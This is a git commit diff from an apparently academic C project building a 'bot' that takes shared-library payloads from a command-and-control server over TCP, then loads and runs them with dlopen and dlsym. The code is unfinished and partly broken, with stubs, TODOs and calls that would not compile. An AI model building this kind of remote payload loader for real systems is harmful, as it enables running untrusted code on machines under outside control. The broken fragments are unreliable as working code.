7af705d89e2883651d44a516b0dd5575ba12f6c9
hmalti <hmalti@polytech-lille.net>
2020-04-16 23:52:56 +0200

    découpe de l'installation et exécution d'une charge utile+ fct rm charge à travailler

--- BOT/bot.c
+++ BOT/bot.c
@@ -7,69 +7,150 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
-#include <libthrd.h>
-#include <libnetwork.h>
 #include <errno.h>
 #include <time.h>
 #include <unistd.h>
 #include <dlfcn.h>
 
 #include "utils.h"
-#define PORT_UDP_CLIENT 4242
-#define PORT_UDP_SERVEUR 4242
-#define PORT_TCP_CLIENT 4242
-#define PORT_TCP_SERVEUR "4242"
-#define TAILLE_STRUCTURE 32
+#include "bot.h"
 
-// Type de la fonction présente dans le .so il faut qu'il soit le plus générique possible
-typedef void (*init_f) (void *);
+#include <libthrd.h>
+#include <libnetwork.h>
+#include <liblistes.h>
 
-extern clock_t debut;
+clock_t debut;
+charge_utile_t charge1;
+charge_utile_t charge2;
 
-void chargerLibDynamic(char *file_name)
+/**
+ * void send_status(info_bot_t info, int socket_tcp)
+ * Fonction qui envoie le statut du bot au CC sur la socket TCP
+ * param la strcuture des infos du BOT
+ * param la socket de communication 
+ 
+*/
+/* void send_status(info_bot_t info, int socket_tcp)
 {
-
-    // PARTIE I : INSTALLATION
-
-    void *plugin;
-    //Chargement du fichier en tant que librairie dynamique
-    plugin = dlopen(file_name, RTLD_NOW);
-    if (!plugin)
+    char status = info.etat;
+    if (write(socket_tcp, status, sizeof(char)) < 0)
     {
-        perror("Cannot load");
+        //traitement de l'erreur
     }
-
-    // PARTIE II : START
-    init_f start = dlsym(plugin, "start");
+} */
+/**
+ * void start_charge(char *file_name, charge_utile_t structure)
+ * Fonction permettant d'exécuter une charge utile 
+ * param structure de la charge utile 
+ */
+void start_charge(charge_utile_t *structure)
+{
+    printf("[start_charge]Start\n");
+    
+    // TO DO : réfléchir sur le plugin ? var extern ?
+    // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
+    printf("je vais start le fichier : %s \n", structure->nom);
+    init_f start = dlsym(structure->plugin, "start");
     char *result = dlerror();
     if (result)
     {
         perror("Cannot find start");
     }
+    //dlclose(structure.nom);
     //Lancement de la fonction start dans un thread
     printf("Lancement du thread sur la fonction chargée\n");
     start(NULL);
     //lanceThread(start, NULL, 0);
 }
-/* 
-void get_status(info_bot_t info, int socket_tcp)
+/**
+ * void print_CU_structure(charge_utile_t structure)
+ * Fonction permettant d'imprimer le contenu d'une structure de charge utile
+ * param une structure de charge utile
+ */
+void print_CU_structure(charge_utile_t *structure)
 {
-    char status = info.etat;
-    if (write(socket_tcp, status, sizeof(char)) < 0)
+    printf("*************** La structure de la charge utile ************ \n");
+    printf("Le nom du fichier dans la structure est : %s\n", structure->nom);
+    //printf("L'adresse ip dans la strcuture est  : %s\n", structure.);
+    //printf("L'état du résultat de la charge utile est : %c\n", structure.resultat);
+    //printf("L'état de l'exécution de la charge utile est : %c\n", structure.executed);
+}
+
+/**
+ * void install_charge(char *file_name)
+ * Fonction permettant d'installer une charge sur le BOT
+ * param le nom de la charge utile
+ */
+
+void install_charge(char *file_name, charge_utile_t *structure)
+{
+    printf("[install_charge]Start\n");
+    void *plugin; // le mettre en extern ? => Non car il sera stocké plus tard dans une liste
+    //Chargement du fichier en tant que librairie dynamique
+    //file_name = PATH du fichier (relatif ou absolu)
+    plugin = dlopen(file_name, RTLD_NOW);
+    if (!plugin)
     {
-    };
+        printf("!!! %s\n", dlerror());
+        return;
+    }
+    // TO DO : créer une liste de charges utiles
+    structure->plugin = plugin;
+    strcpy(structure->nom, file_name);
+    print_CU_structure(structure);
+        // TO DO : Copier dans /usr/lib
+    printf("La charge utile %s a bien été installée ! \n", file_name);
+    
 }
 
-void install_charge()
+void rm_charge(charge_utile_t *structure)
 {
+    printf("[rm_charge]Start\n");
+    printf("je vais supprimer le fichier : %s\n", structure->nom);
+    //TO DO : rm de la liste 
+    // TO DO : rm de la /usr/lib
 }
 
-void start_charge()
+//void receive_cmd_TCP(void *socket)
+/* void receive_cmd_TCP(void *arg)
 {
-}
+    printf("[receive_cmd_TCP]Start\n");
+    char cmd_recue;
+    int socket_tcp = *((int *)socket);
+    // Obtient une structure de fichier 
+    FILE *dialogue = fdopen(socket_tcp, "a+");
+    receiveTCP(socket_tcp, cmd_recue, sizeof(cmd_recue));
+    printf("[receive_cmd_TCP]La cmd que j'ai lu de mon client TCP est : %c\n", cmd_recue);
+    if (dialogue == NULL)
+    {
+        perror("receive_cmd_TCP.fdopen");
+        exit(EXIT_FAILURE);
+    }
 
-void rm_charge()
-{
+    switch (cmd_recue)
+    {
+    case '1': // STATUT
+        send_statut();
+        break;
+
+    case '2': //INSTALL
+        install_charge();
+        break;
+    case '3': //START
+        start_charge();
+        break;
+    case '4': //RM
+        rm_charge();
+        break;
+    case '5': //QUIT
+        break;
+    }
+    //Lancement de la réception de la charge utile dans un thread
+    if (lanceThread(recvFile, (void *)&socket_tcp, sizeof(socket_tcp)) < 0)
+    {
+        perror("ReceiveFile.lanceThread");
+        exit(-1);
+    }
 } */
 
 /**
@@ -112,7 +193,7 @@ void recvFile(void *s)
     fp = fopen("example.so", "w"); // stores the file content in start in the program directory
     if (fp == NULL)
     {
-        printf("Error IN Opening File ");
+        printf("Error IN Opening File\n");
         return;
     }
     //Recoit la taille du fichier
@@ -129,13 +210,21 @@ void recvFile(void *s)
     }
     fclose(fp);
     close(socket_tcp);
-
-    // while (read(socket_tcp, buff, BUFFSIZ) > 0)
-    //     fprintf(fp, "%s", buff);
-
     printf("File received successfully !! \n");
     printf("New File created is start !! \n");
-    chargerLibDynamic("example.so");
+    //install_charge("example.so", &charge1);
+
+    /*
+    (Ca doit être dans une autre fonction qui traite le fichier recu)
+    (/!\ ATTENTION ENORME : Je suis en train de parler de ce qui SERA lorsque tu auras un STOCKAGE 
+    des charges utiles (listes chainées))
+
+    charge_utile_t new_charge_utile = malloc(sizeof(charge_utile_t))
+    
+    Remplissage de la nouvelle charge utile (attributs)
+
+    Appel de la fonction de put dans la liste
+    */
 }
 
 /**
@@ -228,17 +317,31 @@ void partie_udp(clock_t debut)
     }
 }
 
+void creation_liste_CU(){
+
+    return ;
+}
+/** void ajout_CU_liste(charge_utile_t charge)
+ * Fonction permettant de stocker les charges utiles dans une liste chainée
+ */
+void ajout_CU_liste(charge_utile_t *charge,  llist *liste)
+{
+    llist_add_inorder(charge1, liste,int (*comp)(void *, void *));
+}
+
 int main()
 {
-    clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
-    srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand
+    //clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
+    //srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand
 
     // PARTIE envoie UDP en THREAD
     //partie_udp(debut);
 
     // PARTIE SERVEUR TCP en THREAD
-    partie_tcp();
+    //partie_tcp();
 
+    llist *list = llist_create(NULL);
+    ajout_CU_liste();
     while (1)
     {
     }
---
+++ BOT/bot.h
@@ -0,0 +1,24 @@
+#ifndef BOT_H
+#define BOT_H
+
+#define PORT_UDP_CLIENT 4242
+#define PORT_UDP_SERVEUR 4242
+#define PORT_TCP_CLIENT 4242
+#define PORT_TCP_SERVEUR "4242"
+#define TAILLE_STRUCTURE 32
+
+// Type de la fonction présente dans le .so il faut qu'il soit le plus générique possible
+typedef void (*init_f)(void *);
+void start_charge(charge_utile_t *structure);
+void print_CU_structure(charge_utile_t *structure);
+void install_charge(char *file_name, charge_utile_t *structure);
+void rm_charge(charge_utile_t *structure);
+void gestionClientTCP(void *s);
+void recvFile(void *s);
+void nouveauClient(int dialogue);
+void EnvoieBroadcast(void *structure);
+void TCP(void *arg);
+void partie_tcp();
+void partie_udp(clock_t debut);
+
+#endif
